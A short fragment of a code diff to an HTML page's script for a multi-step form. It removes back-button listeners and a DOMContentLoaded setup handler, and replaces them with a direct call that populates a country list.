-        backBtn2.addEventListener('click', () => { nextStep(1); });
-        backBtn3.addEventListener('click', () => { nextStep(2); });
-
-        // Initial setup
-        document.addEventListener('DOMContentLoaded', () => {
-            populateCountries();
-            updatePersonalInfoFields();
-            updateDocumentOptions();
         });
+
+
+        // --- Initialize the form ---
+        populateCountries();
+
     </script>
+
 </body>
 </html>
